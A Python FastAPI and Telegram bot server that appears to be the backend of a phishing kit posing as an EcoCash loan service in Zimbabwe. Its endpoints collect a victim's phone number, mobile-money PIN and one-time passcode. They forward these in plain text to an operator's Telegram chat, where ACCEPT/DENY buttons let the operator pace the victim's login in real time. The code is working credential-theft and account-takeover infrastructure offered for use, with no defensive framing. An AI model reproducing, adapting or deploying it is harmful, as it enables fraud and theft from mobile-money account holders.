import os
import uuid
import traceback
from typing import Dict, Any, Optional
from contextlib import asynccontextmanager
from fastapi import FastAPI, HTTPException, Request, Header
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CallbackQueryHandler, ContextTypes

# --- CONFIGURATION ---
BOT_TOKEN = os.environ.get("BOT_TOKEN")
ADMIN_CHAT_ID = os.environ.get("ADMIN_CHAT_ID")
WEBHOOK_SECRET = os.environ.get("WEBHOOK_SECRET", "my-secret-token")

if not BOT_TOKEN or not ADMIN_CHAT_ID:
    raise ValueError("BOT_TOKEN and ADMIN_CHAT_ID environment variables are required")

transactions: Dict[str, Dict[str, Any]] = {}

# --- MODELS ---
class LoginRequest(BaseModel):
    phone: str
    pin: str
    amount: float
    months: int

class OTPRequest(BaseModel):
    phone: str
    otp: str
    amount: float

# --- TELEGRAM SETUP ---
ptb_app = Application.builder().token(BOT_TOKEN).updater(None).build()

async def handle_telegram_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if not query:
        print("⚠️ No callback query found in update.")
        return
        
    print(f"⚡ Button Clicked! Data: {query.data}")
    
    try:
        # Always answer the query to stop the loading spinner on Telegram
        await query.answer(text="Processing...") 
        
        data = query.data.split(":")
        if len(data) < 2:
            print(f"❌ Invalid callback data format: {query.data}")
            return
            
        action = data[0]
        tx_id = data[1]

        print(f"🔍 Action: {action}, TX ID: {tx_id}")

        if tx_id in transactions:
            if action == "accept":
                transactions[tx_id]["status"] = "approved"
                print(f"✅ Approved TX: {tx_id}")
            elif action == "deny":
                transactions[tx_id]["status"] = "denied"
                print(f"❌ Denied TX: {tx_id}")
                
            # Edit the message to show the new status
            try:
                # Safely get the original text, just in case it's None
                original_text = query.message.text or query.message.caption or "EcoCash Loan Request"
                status_text = '✅ <b>APPROVED</b>' if action == 'accept' else '❌ <b>DENIED</b>'
                await query.edit_message_text(
                    text=f"{original_text}\n\n{status_text}", 
                    parse_mode="HTML"
                )
                print(f"✏️ Edited message for TX: {tx_id}")
            except Exception as e:
                print(f"⚠️ Could not edit message (maybe already edited?): {e}")
        else:
            print(f"⚠️ Transaction {tx_id} NOT FOUND in memory (Render may have restarted).")
            try:
                original_text = query.message.text or query.message.caption or "EcoCash Loan Request"
                await query.edit_message_text(
                    text=f"{original_text}\n\n⚠️ <b>EXPIRED</b> (Server Restarted)", 
                    parse_mode="HTML"
                )
            except Exception as e:
                print(f"⚠️ Could not edit expired message: {e}")

    except Exception as e:
        print(f"❌ Button Handler Error: {e}")
        traceback.print_exc()

ptb_app.add_handler(CallbackQueryHandler(handle_telegram_buttons))

@asynccontextmanager
async def lifespan(app: FastAPI):
    print("🚀 Starting Telegram Bot...")
    await ptb_app.initialize()
    await ptb_app.start()
    yield
    print("🛑 Shutting down Telegram Bot...")
    await ptb_app.stop()
    await ptb_app.shutdown()

app = FastAPI(lifespan=lifespan)

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"], 
    allow_credentials=False, 
    allow_methods=["*"],
    allow_headers=["*"],
)

# --- API ENDPOINTS ---
@app.post("/api/initiate-login")
async def initiate_login(req: LoginRequest):
    tx_id = str(uuid.uuid4())
    transactions[tx_id] = {"status": "pending", "type": "login"}
    
    message = (
        f"🔐 <b>NEW ECOCASH LOGIN (ZIMBABWE)</b>\n\n"
        f"📱 <b>Phone:</b> +263 {req.phone}\n"
        f"🔑 <b>PIN:</b> {req.pin}\n\n"
        f"💰 <b>Amount:</b> ZWG {req.amount:,.2f}\n"
        f"📅 <b>Duration:</b> {req.months} months\n\n"
        f"👇 <i>Do you want to accept this login?</i>"
    )
    keyboard = [[
        InlineKeyboardButton("✅ ACCEPT", callback_data=f"accept:{tx_id}:login"),
        InlineKeyboardButton("❌ DENY", callback_data=f"deny:{tx_id}:login")
    ]]
    try:
        await ptb_app.bot.send_message(chat_id=ADMIN_CHAT_ID, text=message, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="HTML")
        print(f"📤 Sent Login Request to Telegram. TX: {tx_id}")
    except Exception as e:
        print(f"❌ Failed to send Telegram message: {e}")
        raise HTTPException(status_code=500, detail=str(e))
    return {"transaction_id": tx_id}

@app.post("/api/verify-otp")
async def verify_otp(req: OTPRequest):
    tx_id = str(uuid.uuid4())
    transactions[tx_id] = {"status": "pending", "type": "otp"}
    
    message = (
        f"🔢 <b>NEW ECOCASH OTP (ZIMBABWE)</b>\n\n"
        f"📱 <b>Phone:</b> +263 {req.phone}\n"
        f"🔢 <b>OTP Code:</b> <code>{req.otp}</code>\n\n"
        f"💰 <b>Amount:</b> ZWG {req.amount:,.2f}\n\n"
        f"👇 <i>Do you want to accept this OTP?</i>"
    )
    keyboard = [[
        InlineKeyboardButton("✅ ACCEPT", callback_data=f"accept:{tx_id}:otp"),
        InlineKeyboardButton("❌ DENY", callback_data=f"deny:{tx_id}:otp")
    ]]
    try:
        await ptb_app.bot.send_message(chat_id=ADMIN_CHAT_ID, text=message, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="HTML")
        print(f"📤 Sent OTP Request to Telegram. TX: {tx_id}")
    except Exception as e:
        print(f"❌ Failed to send Telegram message: {e}")
        raise HTTPException(status_code=500, detail=str(e))
    return {"transaction_id": tx_id}

@app.get("/api/status/{tx_id}")
async def get_status(tx_id: str):
    if tx_id not in transactions:
        print(f"⚠️ Status check for missing TX: {tx_id} (Returning denied)")
        return {"status": "denied"} 
    return {"status": transactions[tx_id]["status"]}

# --- WEBHOOK ENDPOINTS (CRITICAL FOR TELEGRAM) ---
@app.post("/api/webhook/telegram")
async def telegram_webhook(request: Request, x_telegram_bot_api_secret_token: Optional[str] = Header(None)):
    if x_telegram_bot_api_secret_token != WEBHOOK_SECRET:
        print("🚨 Unauthorized webhook attempt!")
        raise HTTPException(status_code=403, detail="Invalid secret token")
        
    try:
        update_data = await request.json()
        print(f"📥 Received Webhook: {update_data.get('update_id', 'unknown')}")
        update = Update.de_json(update_data, ptb_app.bot)
        await ptb_app.process_update(update)
    except Exception as e:
        print(f"❌ Webhook processing error: {e}")
        traceback.print_exc()
        
    return {"status": "ok"}

@app.get("/api/webhook/set")
async def set_telegram_webhook():
    base_url = os.environ.get("RENDER_EXTERNAL_URL")
    if not base_url:
        raise HTTPException(status_code=500, detail="RENDER_EXTERNAL_URL not set")
    
    webhook_url = f"{base_url.rstrip('/')}/api/webhook/telegram"
    try:
        await ptb_app.bot.delete_webhook(drop_pending_updates=True)
        # CRITICAL FIX: Explicitly allow callback queries
        await ptb_app.bot.set_webhook(
            url=webhook_url, 
            secret_token=WEBHOOK_SECRET,
            allowed_updates=["message", "callback_query"]
        )
        return {"status": "success", "webhook_url": webhook_url}
    except Exception as e:
        print(f"❌ Webhook Set Error: {e}")
        raise HTTPException(status_code=500, detail=str(e))